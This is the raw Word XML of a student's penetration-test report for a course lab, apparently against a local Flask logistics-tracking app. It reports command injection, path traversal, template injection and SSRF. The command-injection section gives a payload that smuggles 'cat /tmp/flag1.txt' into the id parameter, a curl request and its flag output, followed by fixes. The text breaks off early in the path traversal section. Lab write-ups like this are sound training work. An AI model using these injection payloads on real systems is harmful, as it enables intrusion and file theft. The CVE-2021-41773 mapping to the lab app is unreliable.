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9D2" w:rsidRDefault="004A3A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sz w:val="48"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>滲透測試報告</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt;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繳交說明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br/>
        <w:t xml:space="preserve">&gt; 1.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將本文件內容複製貼上至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 xml:space="preserve"> Microsoft Word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，依格式填寫後存成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 xml:space="preserve"> .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>docx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>。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br/>
        <w:t xml:space="preserve">&gt; 2.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每</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>個</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>漏洞的「測試</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>結果截圖</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>」欄位，必須附上實驗成功的</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>截圖，無截圖</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>者該項不計分。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br/>
        <w:t xml:space="preserve">&gt; 3. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>截圖請</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>直接插入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 xml:space="preserve"> Word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對應位置，勿以連結代替。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br/>
        <w:t xml:space="preserve">&gt; 4.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檔名格式：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W10_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滲透測試報告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_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學號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_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姓名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.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>docx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&gt; 5. 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>截止日期：上課當</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>週</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>週日</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體"/>
          <w:color w:val="505050"/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> 23:59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>------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>目標系統：</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>竹流物</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>流查詢系統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server.py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br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>測試日期：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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>月</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>日</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>測試人員：</w:t>
      </w:r>
      <w:r w:rsidR="00780606">
        <w:rPr>
          <w:rFonts w:ascii="微軟正黑體" w:eastAsia="微軟正黑體" w:hAnsi="微軟正黑體" w:cs="微軟正黑體" w:hint="eastAsia"/>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>廖柏煒</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>學號：</w:t>
      </w:r>
      <w:r w:rsidR="00780606">
        <w:rPr>
          <w:rFonts w:ascii="新細明體" w:eastAsia="新細明體" w:hAnsi="新細明體" w:hint="eastAsia"/>
          <w:b/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>1112405021</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">　　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>------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>一、執行摘要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>本次</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>針對竹流物</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>流查詢系統進行黑箱滲透測試，共發現</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4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高風險漏洞，涵蓋指令注入、路徑穿越、模板注入及伺服端請求偽造。其中兩個為嚴重等級（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>CVSS 9.8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>），兩個為高風險等級（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>CVSS 7.2-7.5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>），建議盡速修補以避免系統被完全入侵。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>二、測試範圍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項目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>內容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目標</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>http://127.0.0.1:5000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測試方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>黑箱測試（</w:t>
            </w:r>
            <w:r>
              <w:t>Black-box</w:t>
            </w:r>
            <w:r>
              <w:t>）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測試端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>/track</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>/download</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>/greet</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>/fetch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測試工具</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>瀏覽器、</w:t>
            </w:r>
            <w:r>
              <w:t>curl</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>Python requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>三、漏洞發現</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1 </w:t>
      </w:r>
      <w:r>
        <w:t>指令注入（</w:t>
      </w:r>
      <w:r>
        <w:t>Command Injection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對應</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2026-39808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影響端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>GET /track?id=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風險等級</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>嚴重（</w:t>
            </w:r>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
            <w:r>
              <w:t>）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 xml:space="preserve">CVSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>分數</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>9.8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞描述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 xml:space="preserve">/track </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>端點使用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subprocess.run</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>並設置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell=True</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>，直接將使用者輸入的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> id </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>參數嵌入系統命令字串中。由於未對輸入進行任何過濾或驗證，攻擊者可以透過</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>元字元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如分號</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> ;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>、管道</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>、反引號等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注入任意系統命令，進而執行任意代碼並讀取敏感檔案。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>重現步驟</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>啟動竹流物流查詢系統（</w:t>
      </w:r>
      <w:r>
        <w:t>server.py</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>發送含有命令注入字元的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP GET </w:t>
      </w:r>
      <w:r>
        <w:t>請求至</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> /track?id=</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>觀察回應中是否包含執行命令的結果</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>攻擊</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://127.0.0.1:5000/track?id=12345%3Bcat%20/tmp/flag1.txt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（解碼後：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>123</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>45;cat /tmp/flag1.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>測試結果截圖</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ curl -s "http://localhost:5000/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>track?id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>=12345%3Bcat%20/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/flag1.txt"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;pre&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>查詢單號</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>: 12345</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>FLAG{cmd_injection_cve_2026_39808}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/pre&gt;</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:r w:rsidR="00780606">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4288450B" wp14:editId="00CD890C">
            <wp:extent cx="4686300" cy="246030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04-30 1233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22" cy="24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59D2" w:rsidRDefault="006559D2">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>修補建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>避免使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell=True</w:t>
      </w:r>
      <w:r>
        <w:t>，改用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell=False </w:t>
      </w:r>
      <w:r>
        <w:t>並以列表方式傳遞命令參數</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>實施嚴格的輸入驗證，僅允許純數字格式的訂單編號（</w:t>
      </w:r>
      <w:r>
        <w:t>Allowlist</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>使用正規表達式驗證輸入：</w:t>
      </w:r>
      <w:r>
        <w:t>re.match(r'^\d+$', order_id)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:t>若必須使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
      <w:r>
        <w:t>，應對使用者輸入進行嚴格的跳脫處理</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.2 </w:t>
      </w:r>
      <w:r>
        <w:t>路徑穿越（</w:t>
      </w:r>
      <w:r>
        <w:t>Path Traversal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對應</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2021-41773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影響端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>GET /download?file=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風險等級</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>高（</w:t>
            </w:r>
            <w:r>
              <w:t>High</w:t>
            </w:r>
            <w:r>
              <w:t>）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 xml:space="preserve">CVSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>分數</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>7.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞描述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 xml:space="preserve">/download </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>端點直接將使用者輸入的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>參數與基礎路徑</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">PUBLIC_DIR </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>進行字串</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>串</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>接，未對路徑進行正規化或驗證。攻擊者可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>./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..\\ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>等路徑穿越字元，訪問</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
